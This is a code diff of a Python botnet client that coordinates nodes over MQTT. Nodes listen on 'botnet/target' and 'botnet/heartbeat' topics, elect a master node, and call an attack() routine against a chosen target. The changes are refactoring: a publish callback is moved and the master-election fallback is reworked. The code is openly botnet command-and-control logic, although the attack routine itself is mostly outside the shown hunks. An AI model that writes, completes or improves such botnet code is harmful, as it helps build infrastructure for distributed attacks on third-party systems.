@@ -7,6 +7,9 @@ target=0
 received=-1
 lastId=-555
 nodeId=-1
+def on_publish(client,userdata,result): 
+    print("data published \n")
+    pass
 def on_connectm(client, userdata, flags, rc):
     print("Connected with result code "+str(rc))
     client.subscribe("botnet/target")
@@ -27,7 +30,6 @@ def on_messagem(client, userdata, msg):
 def on_connectsc(client, userdata, flags, rc):
         print("Connected with result code "+str(rc))
         client.subscribe("botnet/heartbeat")
-        
 def on_messagesc(client, userdata, msg):
         global received
         global lastId
@@ -64,10 +66,7 @@ def attack():
                 break
                 return
             startTime=time.time()
-        #delay 
-def on_publish(client,userdata,result): 
-    print("data published \n")
-    pass
+        #delay
 
 def slave():
     global client
@@ -90,8 +89,6 @@ def master():
     global nodeId
     global lastId
     print("No alive nodes, i'll be the master one")
-
-
     client.on_connect = on_connectm
     client.on_message = on_messagem
     client.on_publish = on_publish
@@ -114,8 +111,6 @@ def master():
             
             print("Last id:",lastId)
             print(ret)
-            
-
 def common():
     global client
     def setNodeId(newLastId):
@@ -141,12 +136,14 @@ def common():
             
             if(nodeId==-1 and isReceived()):   
                 setNodeId(lastId+1)
-            if(not isReceived()):
-                master()
-                #client.loop_stop()
-                break
-            else:
+            if(isReceived()):
                 received=0
+            else:
+                nodeId-=1
+##            if(not isReceived()and ):
+##                master()
+##                #client.loop_stop()
+##                break
             if(isSlave()):
                 slave()
     
